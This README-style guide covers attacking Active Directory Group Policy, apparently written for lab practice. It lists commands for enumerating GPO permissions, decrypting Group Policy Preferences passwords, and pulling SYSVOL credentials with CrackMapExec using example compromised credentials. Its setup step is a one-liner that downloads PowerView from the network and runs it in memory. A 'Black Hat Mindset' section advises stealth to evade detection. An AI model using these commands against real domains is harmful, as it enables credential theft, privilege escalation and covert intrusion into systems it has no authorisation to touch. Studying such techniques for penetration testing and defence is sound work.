# Active Directory Group Policy Enumeration and Attack

This README focuses on enumerating and exploiting Group Policy Objects (GPOs) to uncover misconfigurations, extract credentials, and escalate privileges.

## Table of Contents

- [Introduction](#introduction)
- [Setup and Prerequisites](#setup-and-prerequisites)
- [GPO Enumeration](#gpo-enumeration)
- [GPO Exploitation](#gpo-exploitation)
- [Black Hat Mindset](#black-hat-mindset)
- [Resources](#resources)

## Introduction

Group Policy Objects (GPOs) manage settings across an AD domain, but misconfigurations can expose credentials (e.g., via Group Policy Preferences) or grant excessive permissions. This guide covers PowerShell, PowerView, and CrackMapExec to enumerate GPOs and exploit vulnerabilities like GPP password leaks. Commands are executed from Windows or Linux hosts, assuming you have compromised credentials (e.g., domain user access).

## Setup and Prerequisites

- **Environment**: Windows or Linux host with AD access.
- **PowerShell**: Run with administrative privileges on Windows (right-click > "Run as Administrator").
- **PowerView**: Load into memory:
  ```powershell
  IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')
  ```
- **CrackMapExec**: Install on Linux (e.g., `pip install crackmapexec`) and ensure SMB connectivity to the target.
- **gpp-decrypt**: Install on Linux (e.g., part of Kali Linux's `ruby-gpp-decrypt` package) for decrypting GPP passwords.
- **Credentials**: Use compromised domain credentials (e.g., `forend:Klmcargo2`) for enumeration and exploitation.

## GPO Enumeration

Use these commands to enumerate GPOs and their permissions.

```powershell
# Enumerates GPO names in the target domain using PowerView (Windows host)
Get-DomainGPO | select displayname

# Lists all GPO names using PowerShell (Windows host; requires the GroupPolicy module)
Import-Module GroupPolicy
Get-GPO -All | Select DisplayName

# Creates a variable $sid with the SID of the "Domain Users" group using PowerView
$sid=Convert-NameToSid "Domain Users"

# Checks if "Domain Users" has rights over any GPOs
Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}

# Displays the name of a GPO by its GUID using PowerShell
Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532
```

## GPO Exploitation

Exploit GPO misconfigurations to extract credentials or escalate privileges.

```bash
# Decrypts a captured Group Policy Preferences (GPP) password
gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE

# Lists available CrackMapExec SMB modules and filters for GPP-related modules
crackmapexec smb -L | grep gpp

# Uses CrackMapExec to retrieve credentials stored in the SYSVOL share
crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin
```

## Black Hat Mindset

- **Target GPP Passwords**: Hunt for GPP passwords in SYSVOL—older systems often store them encrypted with a known key.
- **Exploit Permissions**: Check for GPOs where low-privileged groups (e.g., Domain Users) have edit rights for privilege escalation.
- **Stay Stealthy**: Use in-memory execution for PowerView and avoid modifying SYSVOL to evade detection.
- **Expand Access**: Decrypted GPP credentials can enable lateral movement or privilege escalation.

## Resources

- PowerView Documentation
- CrackMapExec Guide
- GPP Password Decryption
- GPO Abuse

